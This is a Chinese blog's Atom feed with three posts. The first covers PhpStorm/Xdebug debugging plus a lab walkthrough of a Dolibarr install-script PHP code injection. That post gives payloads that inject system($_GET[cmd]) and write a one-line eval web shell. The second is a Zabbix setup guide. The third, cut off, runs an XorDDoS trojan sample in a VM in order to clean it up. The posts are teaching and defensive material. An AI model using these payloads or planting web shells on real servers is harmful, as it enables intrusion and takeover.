<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DiZai</title>
  
  <subtitle>Just do IT</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-11T15:46:28.358Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>迪仔</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Phpstorm+phpstudy+xdebug+Dolibarr</title>
    <link href="http://yoursite.com/2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/"/>
    <id>http://yoursite.com/2018/08/11/Phpstorm-phpstudy-xdebug-Dolibarr/</id>
    <published>2018-08-11T15:20:00.000Z</published>
    <updated>2018-08-11T15:46:28.358Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。</p></blockquote><a id="more"></a><h3 id="【准备】"><a href="#【准备】" class="headerlink" title="【准备】"></a>【准备】</h3><p><strong>先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考<a href="https://blog.csdn.net/finish_dream/article/details/80045514" target="_blank" rel="noopener">https://blog.csdn.net/finish_dream/article/details/80045514</a> 亲测有效。</strong></p><h3 id="【配置步骤】"><a href="#【配置步骤】" class="headerlink" title="【配置步骤】"></a>【配置步骤】</h3><p><strong>进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。</strong></p><p><strong>1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。</strong></p><p><img src="/images/pasted-50.png" alt="upload successful"></p><p><strong>2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line"></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.trace_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.auto_trace=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_params=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_return=1</span><br><span class="line"></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.profiler_enable = 1</span><br><span class="line"></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line"></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line"></span><br><span class="line">xdebug.remote_handler = &quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line"></span><br><span class="line">xdebug.remote_host = &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_port = 9000</span><br></pre></td></tr></table></figure><p><strong>3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。</strong></p><p><img src="/images/pasted-51.png" alt="upload successful"></p><p>open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。</p><p><img src="/images/pasted-52.png" alt="upload successful"></p><p><strong>4.选择PHP的版本信息。</strong></p><p><img src="/images/pasted-54.png" alt="upload successful"></p><p>Debug端口设置</p><p><img src="/images/pasted-55.png" alt="upload successful"></p><p>IDEKEY：</p><p><img src="/images/pasted-56.png" alt="upload successful"></p><p>配置PHP Web Application</p><p><img src="/images/pasted-57.png" alt="upload successful"></p><p>查看配置：</p><p><img src="/images/pasted-58.png" alt="upload successful"></p><p>xdebug配置完成了</p><p><strong>3.实现截取操作</strong></p><p>在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。</p><p><img src="/images/pasted-59.png" alt="upload successful"></p><p>在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。</p><p><img src="/images/pasted-60.png" alt="upload successful"></p><p>选择一个浏览器打开写好的文件</p><p><img src="/images/pasted-61.png" alt="upload successful"></p><p>截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了。</p><p><img src="/images/pasted-62.png" alt="upload successful"></p><h4 id="Dolibarr-ERP-CRM-php代码注入漏洞"><a href="#Dolibarr-ERP-CRM-php代码注入漏洞" class="headerlink" title="Dolibarr ERP/CRM php代码注入漏洞"></a>Dolibarr ERP/CRM php代码注入漏洞</h4><p><strong>Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。</strong></p><p><strong>1、先配置好Dolibarr环境。</strong></p><p>将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。</p><p><img src="/images/pasted-63.png" alt="upload successful"><br>然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。</p><p><img src="/images/pasted-64.png" alt="upload successful"></p><p>打开浏览器输入127.0.0.1/install</p><p><img src="/images/pasted-65.png" alt="upload successful"></p><p>然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。</p><p><img src="/images/pasted-66.png" alt="upload successful"></p><p>安装完毕后，会在Phpstrom中自动截取到step1.php的文件。</p><p><img src="/images/pasted-67.png" alt="upload successful"></p><p><strong>2、开始代码的修改。</strong></p><p>step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法</p><p><img src="/images/pasted-68.png" alt="upload successful"></p><p>按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。</p><p><img src="/images/pasted-69.png" alt="upload successful"></p><p>ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。</p><p><img src="/images/pasted-70.png" alt="upload successful"></p><p>继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。</p><p><img src="/images/pasted-71.png" alt="upload successful"></p><p>继续往下走，直接定位到写入数据库名称的代码段</p><p><img src="/images/pasted-72.png" alt="upload successful"></p><p>提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。</p><p>数据库名称改为dolibarr \’;phpinfo();//</p><p><img src="/images/pasted-73.png" alt="upload successful"></p><p>配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止</p><p><img src="/images/pasted-74.png" alt="upload successful"></p><p>Ø通过包含此文件的文件去间接的执行代码</p><p><img src="/images/pasted-75.png" alt="upload successful"></p><p>更改payload，执行系统命令并getshell</p><p><img src="/images/pasted-76.png" alt="upload successful"></p><p>将db_name改为dolibarr \’;system($_GET[cmd]);//</p><p><img src="/images/pasted-77.png" alt="upload successful"></p><p>访问/insex.php?cmd={command}</p><p><img src="/images/pasted-79.png" alt="upload successful"></p><p>修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php</p><p><img src="/images/pasted-82.png" alt="upload successful"></p><p>请求后会在网站根目录下生成一句话木马，尝试用菜刀连接</p><p><img src="/images/pasted-80.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix可视化监控的搭建</title>
    <link href="http://yoursite.com/2018/08/10/Zabbix%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2018/08/10/Zabbix可视化监控的搭建/</id>
    <published>2018-08-10T12:07:00.000Z</published>
    <updated>2018-08-11T15:50:30.984Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。</p></blockquote><a id="more"></a><h3 id="0x01-【操作环境】"><a href="#0x01-【操作环境】" class="headerlink" title="0x01 【操作环境】"></a>0x01 【操作环境】</h3><p>CentOS Linux release 7.5.1804 (Core)<br>zabbix版本：zabbix-3.4.12</p><h3 id="0x02-【环境准备】"><a href="#0x02-【环境准备】" class="headerlink" title="0x02 【环境准备】"></a>0x02 【环境准备】</h3><p><strong>1、LAMP安装和启动：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apache安装：yum install http* -y  </span><br><span class="line">Apache启动：systemctl start httpd  </span><br><span class="line">Mariadb安装：yum install mariadb-server mariadb -y  </span><br><span class="line">Mariadb启动：systemctl start mariadb.service  </span><br><span class="line">PHP安装：yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php-bcmath -y</span><br></pre></td></tr></table></figure></p><p><strong>LAMP安装参考资料：<a href="https://www.cnblogs.com/me80/p/7218883.html" target="_blank" rel="noopener">https://www.cnblogs.com/me80/p/7218883.html</a> </strong></p><p><strong>2、GCC环境安装</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc gcc-c++ autoconf automake zlib zlib-devel openssl openssl-devel pcre pcre-devel -y</span><br></pre></td></tr></table></figure></p><p><strong>3、selinux和防火墙处理</strong><br>进入seliunx配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/selinux/config SELINUX=disabled  #重启才生效</span><br><span class="line">selinux：setenforce 0  #临时关闭</span><br><span class="line">systemctl stop firewalld.service   #关闭防火墙</span><br></pre></td></tr></table></figure></p><h3 id="0x03-【安装步骤】"><a href="#0x03-【安装步骤】" class="headerlink" title="0x03 【安装步骤】"></a>0x03 【安装步骤】</h3><h4 id="一、安装zabbix"><a href="#一、安装zabbix" class="headerlink" title="一、安装zabbix"></a>一、安装zabbix</h4><p><strong>1、在官网下载zabbix安装包，<a href="https://www.zabbix.com/download" target="_blank" rel="noopener">https://www.zabbix.com/download</a></strong><br><strong>2、解压软件包并安装依赖包</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/src  </span><br><span class="line">tar -zxvf zabbix-3.4.12.tar.gz  </span><br><span class="line">yum -y install net-snmp-devel libxml2-devel libcurl-deve libevent libevent-devel libcurl</span><br></pre></td></tr></table></figure></p><p><strong>3、编译安装zabbix</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd zabbix-3.4.3/       #切换进入zabbix目录  </span><br><span class="line">./configure --prefix=/data/server/zabbix --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2         #编译zabbix  </span><br><span class="line">make&amp;&amp;make install     #安装zabbix,此步骤有点长，请耐心等待。</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-36.png" alt="upload successful"></p><h4 id="二、配置zabbix"><a href="#二、配置zabbix" class="headerlink" title="二、配置zabbix"></a>二、配置zabbix</h4><p><strong>1、创建用户账户</strong><br>对于所有Zabbix的守护进程，需要一个无特权的用户。如果Zabbix守护进程以一个无特权的用户账户启动，那么它会使用该用户运行。<br>然而，如果一个守护进程以‘root’用户启动，它会切换为‘zabbix’用户账户，且这个用户必须存在。在Linux系统中，可以使用下面命令建立一个用户（该用户属于自己的用户组，“zabbix”）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd zabbix</span><br><span class="line">useradd -g zabbix zabbix</span><br></pre></td></tr></table></figure></p><p><strong>2、数据库导入zabbix template<br>使用数据库用户zabbix登录数据库</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql –uzabbix –p</span><br><span class="line">use zabbix;    #切换到zabbix库</span><br><span class="line">#导入zabbix默认表</span><br><span class="line">source /usr/local/src/zabbix-3.4.12/database/mysql/schema.sql;  </span><br><span class="line">source/usr/local/src/zabbix-3.4.12/database/mysql/images.sql;</span><br><span class="line">source /usr/local/src/zabbix-3.4.12/database/mysql/data.sql;</span><br></pre></td></tr></table></figure></p><p><strong>3、创建zabbix用户和日志目录并给予权限</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd -s /sbin/nologin zabbix   #创建用户</span><br><span class="line">mkdir /usr/local/zabbix/logs    #创建目录</span><br><span class="line">chown -R zabbix:zabbix /usr/local/zabbix  #给予权限</span><br></pre></td></tr></table></figure></p><p><strong>4、配置zabbix的服务端（server）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim /data/server/zabbix/etc/zabbix_server.conf </span><br><span class="line">&gt;</span><br><span class="line">LogFile=/data/server/zabbix/logs/zabbix_server.log</span><br><span class="line">PidFile=/data/server/zabbix/zabbix_server.pid</span><br><span class="line">DBHost=localhost</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=123456</span><br><span class="line">DBSocket=/data/server/mysql/mysql.sock</span><br><span class="line">Timeout=4</span><br><span class="line">LogSlowQueries=3000</span><br><span class="line">Include=/data/server/zabbix/etc/zabbix_server.conf.d/*.conf</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-37.png" alt="upload successful"><br><strong>5、配置zabbix客户端（agent）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /data/server/zabbix/etc/zabbix_agentd.conf</span><br><span class="line">&gt;</span><br><span class="line">PidFile=/data/server/zabbix/zabbix_agentd.pid</span><br><span class="line">LogFile=/data/server/zabbix/logs/zabbix_agentd.log</span><br><span class="line">Server=127.0.0.1</span><br><span class="line">ListenPort=10050</span><br><span class="line">ServerActive=127.0.0.1</span><br><span class="line">Hostname=Zabbix server</span><br><span class="line">Include=/data/server/zabbix/etc/zabbix_agentd.conf.d/*.conf</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-38.png" alt="upload successful"><br><strong>6、配置PHP相应的文件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/php.ini</span><br><span class="line">&gt;</span><br><span class="line">php_value max_execution_time 300</span><br><span class="line">php_value memory_limit 128M</span><br><span class="line">php_value post_max_size 16M</span><br><span class="line">php_value upload_max_filesize 2M</span><br><span class="line">php_value max_input_time 300</span><br><span class="line">php_value always_populate_raw_post_data -1</span><br><span class="line">date.timezone = Asia/Shanghai</span><br></pre></td></tr></table></figure></p><p><strong>7、安装zabbix web界面</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/html/zabbix</span><br><span class="line">cd /usr/local/src/zabbix-3.4.0/frontends/php </span><br><span class="line">cp -a . /var/www/html/zabbix</span><br></pre></td></tr></table></figure></p><p><strong>8、启动zabbix服务</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd    #启动apache服务</span><br><span class="line">/data/server/mysql/support-files/mysql.server start      #启动数据库服务</span><br><span class="line">/data/server/zabbix/sbin/zabbix_server       #启动zabbix服务端服务</span><br><span class="line">/data/server/zabbix/sbin/zabbix_agentd  #在所有的被监控机器上启动zabbix_agentd</span><br></pre></td></tr></table></figure></p><h4 id="三、配置zabbix前端"><a href="#三、配置zabbix前端" class="headerlink" title="三、配置zabbix前端"></a>三、配置zabbix前端</h4><p><strong>1、在你的浏览器中，打开Zabbix URL： http://&lt;服务器IP或主机名&gt;/zabbix<br><a href="http://192.168.199.206/zabbix/setup.php" target="_blank" rel="noopener">http://192.168.199.206/zabbix/setup.php</a><br>你可以看到前端安装向导的第一个页面。</strong></p><p><img src="/images/pasted-39.png" alt="upload successful"></p><p><strong>2、确认满足所有的软件安装前置条件,如果下图这些显示Failed，那么我们编辑/etc/php.ini，将下图中的配置项都改成要求的大小，未配置的项进行手动添加</strong><br>vim /etc/php.ini</p><p><img src="/images/pasted-40.png" alt="upload successful"></p><p>如果出现PHP xmlwiter，PHP smlreader off 那么请键入下条命令<br>yum install php-bcmath php-mbstring php-xmlwriter php-xmlreader<br>PHP LDAP Warning 不用管，直接下一步</p><p><img src="/images/pasted-41.png" alt="upload successful"><br><strong>3、输入连接数据库的详细信息。Zabbix数据库必须是已经创建好的。</strong></p><p><img src="/images/pasted-42.png" alt="upload successful"><br><strong>4、输入Zabbix Server的详细信息。</strong></p><p><img src="/images/pasted-43.png" alt="upload successful"><br><strong>5、检查设置信息。</strong></p><p><img src="/images/pasted-44.png" alt="upload successful"><br><strong>6、下载配置文件，将它放置在Web服务器HTML文档子目录（即你复制Zabbix PHP文件的目录）的conf/路径下。</strong><br>cd /var/www/html/zabbix/conf<br>rz<br>使用rz命令上传就可以了</p><p><img src="/images/pasted-45.png" alt="upload successful"></p><p><img src="/images/pasted-46.png" alt="upload successful"></p><p><strong>7、上传完毕后，完成安装。</strong></p><p><img src="/images/pasted-47.png" alt="upload successful"><br><strong>8、Zabbix前端已经就绪！默认的用户名是Admin，密码是zabbix。</strong></p><p><img src="/images/pasted-48.png" alt="upload successful"></p><p><strong>登录后显示界面：</strong></p><p><img src="/images/pasted-49.png" alt="upload successful"></p><p><strong>使用说明参考文档：<a href="https://www.zabbix.com/documentation/3.4/manual/quickstart/login" target="_blank" rel="noopener">https://www.zabbix.com/documentation/3.4/manual/quickstart/login</a></strong></p><h3 id="0x04-【参考文献】"><a href="#0x04-【参考文献】" class="headerlink" title="0x04 【参考文献】"></a>0x04 【参考文献】</h3><p><a href="https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQL" target="_blank" rel="noopener">https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQL</a><br><a href="https://www.cnblogs.com/kowloon/p/7771495.html" target="_blank" rel="noopener">https://www.cnblogs.com/kowloon/p/7771495.html</a><br><a href="http://blog.51cto.com/xpu2001/2052634" target="_blank" rel="noopener">http://blog.51cto.com/xpu2001/2052634</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="zabbix" scheme="http://yoursite.com/tags/zabbix/"/>
    
      <category term="监控" scheme="http://yoursite.com/tags/%E7%9B%91%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>记一次XorDDos木马的清除</title>
    <link href="http://yoursite.com/2018/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1XorDDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%B8%85%E9%99%A4/"/>
    <id>http://yoursite.com/2018/08/10/记一次XorDDos木马的清除/</id>
    <published>2018-08-10T10:00:00.000Z</published>
    <updated>2018-08-10T11:52:14.466Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。</p></blockquote><a id="more"></a><h3 id="0x01-【实现环境】"><a href="#0x01-【实现环境】" class="headerlink" title="0x01 【实现环境】"></a>0x01 【实现环境】</h3><p>CentOS Linux release 7.5.1804 (Core)</p><p><strong>在植入木马之前一定要记得把虚拟机的网络设置成NAT或host-only模式防止病毒传播到本机或造成破坏！</strong></p><h3 id="0x02-【植入木马】"><a href="#0x02-【植入木马】" class="headerlink" title="0x02 【植入木马】"></a>0x02 【植入木马】</h3><p>把XorDDos的病毒样本上传到liunx机器中，进行解压，运行木马文件，执行完之后发现木马自毁了文件，可知是一个并不一般的木马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unzip XorDDos样本-密码123.zip </span><br><span class="line">chmod +x a753cb1ff86c742bb497155362664c3b </span><br><span class="line">./a753cb1ff86c742bb497155362664c3b </span><br><span class="line">sh b3c466263551794bb247c68ff1bc357a.sh </span><br><span class="line">./b3c466263551794bb247c68ff1bc357a</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-19.png" alt="upload successful"></p><h3 id="0x03-【杀马全过程】"><a href="#0x03-【杀马全过程】" class="headerlink" title="0x03 【杀马全过程】"></a>0x03 【杀马全过程】</h3><p>1.发现cpu使用超高、网络流量异常、服务器还会出现卡顿现象。<br>通过top发现会有几个可疑的程序占用了CPU。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>2.执行tcpdump -i ens33后发现网络的流量异常，不断在往外发送请求。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i ens33</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-21.png" alt="upload successful"><br>3.通过lsof -i 看到了一个可疑的服务，PID为1657。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-34.png" alt="upload successful"><br>4.尝试着杀掉这个进程 kill -9 1657，发现又起了另一个服务进程，猜测这个木马会不断的改名自启。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 1657</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-22.png" alt="upload successful"><br><strong>查杀思路：<br>由于运行进程有多个相互保护（参考一下pstree），而且和病毒文件直接也是相互配合，如果直接删除也会重新生成一个新的病毒文件，所以查杀的基本的思路是：删除定时任务中的病毒启动—&gt;破坏病毒文件使其不可执行（不要删除，否会自动生成）—&gt;停止系统病毒进程—&gt;删除病毒文件—&gt;清理感染文件—&gt;关闭病毒开机启动<br>以下查杀可以自由组合，按上面查杀思路排列即可！</strong></p><p>5.查看木马进程的位置。(proc之后跟的数字文件就是程序的PID)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /proc/9257</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-23.png" alt="upload successful"><br>我们还可以尝试使用rkhunter或chkrootkit工具看看有哪些文件被木马篡改过。步骤略。</p><p>6.查看计划任务，没有发现任何任务，可是其他同学会发现，从而可以定位木马的目录在/etc/cron.hourly/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   #查看计划任务</span><br></pre></td></tr></table></figure></p><p><img 